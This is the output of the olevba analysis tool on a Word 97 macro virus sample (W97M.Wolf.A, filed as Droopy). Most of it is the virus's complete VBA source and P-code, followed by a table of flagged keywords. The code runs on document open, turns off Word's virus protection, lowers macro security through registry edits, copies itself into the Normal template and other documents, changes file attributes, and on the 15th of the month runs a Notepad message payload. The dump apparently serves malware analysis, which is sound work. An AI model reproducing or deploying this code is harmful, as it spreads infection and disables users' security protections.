olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Droopy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Droopy - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Wolf.bas 
in file: ./Virus.MSWord.Droopy - OLE stream: 'Macros/VBA/Wolf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Call EndProtect
    Call Infection
    Call SearchF
    If Day(Now) = 15 Then Call Payload
End Sub

Sub HelpAbout()
With Application.Assistant
    .Visible = True
End With
MsgBox "Very Thanx to Tex Avery. hahahahaha", vbInformation, "W97M.Wolf.A"
Application.UserName = "My Name is Wolf"
End Sub

Sub AutoClose()
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Wolf"
    .Title = "My Friend the Wolf"
    .Subject = "Tex Avery and the other"
    .Keywords = "Wolf, Tex Avery, Ed Love, Droopy"
    .Comments = "No comments"
    .Execute
End With
If Left(ActiveDocument.Name, 8) <> "Document" And ActiveDocument.Saved = False Then
ActiveDocument.Save
End If
End Sub
Sub Infection()
On Error Resume Next
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
DropFile = "C:\Wolf.sys"
If Nor.Item("Wolf").Name <> "Wolf" Then
    Doc("Wolf").Export DropFile
    Nor.Import DropFile
End If
If Doc.Item("Wolf").Name <> "Wolf" Then
    Nor("Wolf").Export DropFile
    Doc.Import DropFile
    ActiveDocument.Save
End If
End Sub

Sub SearchF()
With Application.FileSearch
    .FileName = "*.doc"
    .LookIn = "C:\"
    .SearchSubFolders = False
    .FileType = msoFileTypeWordDocuments
    .Execute
    For I = 1 To .FoundFiles.Count
        FileSystem.SetAttr .FoundFiles(I), vbNormal
    Next I
End With
End Sub

Sub EndProtect()
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
End Sub

Sub Payload()
    MyApp = Shell("notepad.exe", 1)
    SendKeys "This is my last Word97Macro virus.", True
    AppActivate (MyApp)
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Droopy
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Wolf - 4704 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	ArgsCall (Call) EndProtect 0x0000 
' Line #2:
' 	ArgsCall (Call) Infection 0x0000 
' Line #3:
' 	ArgsCall (Call) SearchF 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Payload 0x0000 
' 	EndIf 
' Line #5:
' 	EndSub 
' Line #6:
' Line #7:
' 	FuncDefn (Sub HelpAbout())
' Line #8:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Assistant 
' 	With 
' Line #9:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #10:
' 	EndWith 
' Line #11:
' 	LitStr 0x0023 "Very Thanx to Tex Avery. hahahahaha"
' 	Ld vbInformation 
' 	LitStr 0x000B "W97M.Wolf.A"
' 	ArgsCall MsgBox 0x0003 
' Line #12:
' 	LitStr 0x000F "My Name is Wolf"
' 	Ld Application 
' 	MemSt UserName 
' Line #13:
' 	EndSub 
' Line #14:
' Line #15:
' 	FuncDefn (Sub AutoClose())
' Line #16:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #17:
' 	LitStr 0x0004 "Wolf"
' 	MemStWith Author 
' Line #18:
' 	LitStr 0x0012 "My Friend the Wolf"
' 	MemStWith Title 
' Line #19:
' 	LitStr 0x0017 "Tex Avery and the other"
' 	MemStWith Subject 
' Line #20:
' 	LitStr 0x0020 "Wolf, Tex Avery, Ed Love, Droopy"
' 	MemStWith Keywords 
' Line #21:
' 	LitStr 0x000B "No comments"
' 	MemStWith Comments 
' Line #22:
' 	ArgsMemCallWith Execute 0x0000 
' Line #23:
' 	EndWith 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #25:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub Infection())
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Nor 
' Line #31:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set Doc 
' Line #32:
' 	LitStr 0x000B "C:\Wolf.sys"
' 	St DropFile 
' Line #33:
' 	LitStr 0x0004 "Wolf"
' 	Ld Nor 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "Wolf"
' 	Ne 
' 	IfBlock 
' Line #34:
' 	Ld DropFile 
' 	LitStr 0x0004 "Wolf"
' 	ArgsLd Doc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	Ld DropFile 
' 	Ld Nor 
' 	ArgsMemCall Import 0x0001 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	LitStr 0x0004 "Wolf"
' 	Ld Doc 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0004 "Wolf"
' 	Ne 
' 	IfBlock 
' Line #38:
' 	Ld DropFile 
' 	LitStr 0x0004 "Wolf"
' 	ArgsLd Nor 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #39:
' 	Ld DropFile 
' 	Ld Doc 
' 	ArgsMemCall Import 0x0001 
' Line #40:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub SearchF())
' Line #45:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #46:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #47:
' 	LitStr 0x0003 "C:\"
' 	MemStWith LookIn 
' Line #48:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' Line #49:
' 	Ld msoFileTypeWordDocuments 
' 	MemStWith FileType 
' Line #50:
' 	ArgsMemCallWith Execute 0x0000 
' Line #51:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #52:
' 	Ld I 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Ld vbNormal 
' 	Ld FileSystem 
' 	ArgsMemCall SetAttr 0x0002 
' Line #53:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #54:
' 	EndWith 
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' 	FuncDefn (Sub EndProtect())
' Line #58:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #59:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #60:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #61:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #62:
' 	EndWith 
' Line #63:
' 	Ld Application 
' 	MemLd Version 
' 	SelectCase 
' Line #64:
' 	LitStr 0x0004 "10.0"
' 	Case 
' 	CaseDone 
' Line #65:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #66:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x000A "AccessVBOM"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #67:
' 	LitStr 0x0003 "9.0"
' 	Case 
' 	CaseDone 
' Line #68:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #69:
' 	EndSelect 
' Line #70:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Sub Payload())
' Line #74:
' 	LitStr 0x000B "notepad.exe"
' 	LitDI2 0x0001 
' 	ArgsLd Shell 0x0002 
' 	St MyApp 
' Line #75:
' 	LitStr 0x0022 "This is my last Word97Macro virus."
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #76:
' 	Ld MyApp 
' 	Paren 
' 	ArgsCall AppActivate 0x0001 
' Line #77:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |notepad.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

